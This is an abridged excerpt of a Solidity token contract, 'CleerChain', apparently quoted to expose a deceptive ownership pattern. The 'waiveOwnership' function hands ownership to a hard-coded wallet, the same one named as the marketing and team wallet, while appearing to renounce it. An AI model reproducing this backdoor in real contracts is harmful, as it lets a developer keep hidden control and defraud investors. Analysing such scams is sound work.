...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xBB66F1792d8501Fce1c7da19887CdfA83E289e9b);
    }
...
contract CleerChain is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0xBB66F1792d8501Fce1c7da19887CdfA83E289e9b);
    address payable public teamWalletAddress = payable(0xBB66F1792d8501Fce1c7da19887CdfA83E289e9b);
